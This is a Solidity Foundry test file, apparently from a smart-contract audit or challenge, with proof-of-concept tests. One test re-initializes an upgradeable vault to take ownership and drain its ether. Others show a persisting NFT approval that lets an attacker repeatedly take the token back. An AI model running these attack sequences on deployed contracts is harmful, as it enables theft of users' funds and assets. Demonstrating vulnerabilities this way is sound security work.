// SPDX-License-Identifier: MIT
pragma solidity ^0.8.29;

import {Test, console} from "forge-std/Test.sol";
import {UpgradeableVault} from "src/UpgradeableVault.sol";
import {NFTMarket} from "src/NFTMarket.sol";

// forge test --via-ir
contract UpgradeableVaultTest is Test {
    function test_FullAttack_ReInitAndDrain() public {
        address admin = makeAddr("admin");
        address attacker = makeAddr("attacker");
        address alice = makeAddr("alice");

        UpgradeableVault vault = new UpgradeableVault();
        vault.initialize(admin); // admin = trusted deployer

        vm.deal(alice, 100 ether);
        vm.prank(alice);
        vault.deposit{value: 50 ether}(); // deposit zeroes _owner

        assertEq(vault.owner(), address(0)); // _owner is now zero

        vm.prank(attacker);
        vault.initialize(attacker); // re-initialization succeeds
        assertEq(vault.owner(), attacker);

        vm.prank(attacker);
        vault.withdrawAll(attacker); // drain
        assertEq(address(vault).balance, 0); // vault empty
    }
}

contract PoC2_ApprovalPersistsTest is Test {
    NFTMarket market;
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address attacker = makeAddr("attacker");
    uint256 constant NFT_ID = 1;

    function setUp() public {
        market = new NFTMarket();
        market.mint(alice, NFT_ID);
        assertEq(market.nftOwner(NFT_ID), alice);
    }

    // shows that after transferFrom, the approval is not cleared in persistent storage.
    function test_PoC2_ApprovalSurvivesTransfer() public {
        vm.prank(alice);
        market.approve(attacker, NFT_ID);
        assertEq(market.approvals(NFT_ID), attacker, "attacker approved");

        // attacker transfers NFT from alice to bob (legitimate transfer)
        vm.prank(attacker);
        market.transferFrom(alice, bob, NFT_ID);
        assertEq(market.nftOwner(NFT_ID), bob, "bob owns the NFT now");

        // BUG approval should be cleared but it persists in persistent storage
        address approvalAfter = market.approvals(NFT_ID);
        console.log("Approval after transfer:", approvalAfter);
        assertEq(approvalAfter, attacker, "BUG: approval was NOT cleared");
    }

    /// Full attack: attacker keeps stealing the NFT back after every transfer
    function test_PoC2_RepeatedNFTTheft() public {
        vm.prank(alice);
        market.approve(attacker, NFT_ID);

        // alice -> bob (legitimate)
        vm.prank(attacker);
        market.transferFrom(alice, bob, NFT_ID);
        assertEq(market.nftOwner(NFT_ID), bob);

        // approval should be gone - but it isn't (tstore instead of sstore).
        // bob -> attacker (no new approval needed)
        vm.prank(attacker);
        market.transferFrom(bob, attacker, NFT_ID);
        assertEq(market.nftOwner(NFT_ID), attacker, "attacker stole it from bob");

        // Give it away again, then steal it back again
        address charlie = makeAddr("charlie");
        vm.prank(attacker);
        market.transferFrom(attacker, charlie, NFT_ID);

        // charlie -> attacker
        vm.prank(attacker);
        market.transferFrom(charlie, attacker, NFT_ID);
        assertEq(market.nftOwner(NFT_ID), attacker, "stolen again");

        console.log("Attacker stole NFT", NFT_ID, "repeatedly without re-approval");
    }

    /// Verify selectors to confirm the ordering that causes the collision
    function test_PoC2_SelectorOrdering() public pure {
        bytes4 execSel = NFTMarket.execute.selector;
        bytes4 transferSel = NFTMarket.transferFrom.selector;
        // execute(bytes) = 0x09c5eabe, transferFrom(...) = 0x23b872dd
        assert(uint32(execSel) < uint32(transferSel));
    }
}
